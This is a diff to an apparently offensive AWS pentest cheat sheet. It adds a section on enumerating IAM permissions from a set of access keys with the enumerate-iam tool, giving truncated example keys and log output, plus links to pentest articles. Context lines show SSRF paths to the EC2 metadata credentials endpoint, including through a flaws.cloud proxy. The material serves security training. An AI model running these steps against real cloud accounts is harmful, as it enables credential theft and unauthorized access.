@@ -40,7 +40,7 @@
 		result = s3.list_buckets()
 		print(result)
 	except Exception as e:
-		print(e
+		print(e)
 	```
 
 ## AWS Configuration
@@ -184,6 +184,32 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
 For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
 
 
+## Enumerate IAM permissions
+
+Enumerate the permissions associated with AWS credential set with [enumerate-iam](https://github.com/andresriancho/enumerate-iam)
+
+```powershell
+git clone git@github.com:andresriancho/enumerate-iam.git
+cd enumerate-iam/
+pip install -r requirements.txt
+./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
+2019-05-10 15:57:58,447 - 21345 - [INFO] Starting permission enumeration for access-key-id "AKIA..."
+2019-05-10 15:58:01,532 - 21345 - [INFO] Run for the hills, get_account_authorization_details worked!
+2019-05-10 15:58:01,537 - 21345 - [INFO] -- {
+    "RoleDetailList": [
+        {
+            "Tags": [], 
+            "AssumeRolePolicyDocument": {
+                "Version": "2008-10-17", 
+                "Statement": [
+                    {
+...
+2019-05-10 15:58:26,709 - 21345 - [INFO] -- gamelift.list_builds() worked!
+2019-05-10 15:58:26,850 - 21345 - [INFO] -- cloudformation.list_stack_sets() worked!
+2019-05-10 15:58:26,982 - 21345 - [INFO] -- directconnect.describe_locations() worked!
+2019-05-10 15:58:27,021 - 21345 - [INFO] -- gamelift.describe_matchmaking_rule_sets() worked!
+2019-05-10 15:58:27,311 - 21345 - [INFO] -- sqs.list_queues() worked!
+```
 
 ## References
 
@@ -192,3 +218,6 @@ For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws
 * [flaws.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route](http://flaws.cloud/)
 * [flaws2.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route](http://flaws2.cloud)
 * [Guardzilla video camera hardcoded AWS credential - 0dayallday.org](https://www.0dayallday.org/guardzilla-video-camera-hard-coded-aws-credentials/)
+* [AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity](https://www.virtuesecurity.com/aws-penetration-testing-part-1-s3-buckets/)
+* [AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity](https://www.virtuesecurity.com/aws-penetration-testing-part-2-s3-iam-ec2/)
+* [A Technical Analysis of the Capital One Hack - CloudSploit - Aug 2 2019](https://blog.cloudsploit.com/a-technical-analysis-of-the-capital-one-hack-a9b43d7c8aea?gi=8bb65b77c2cf)
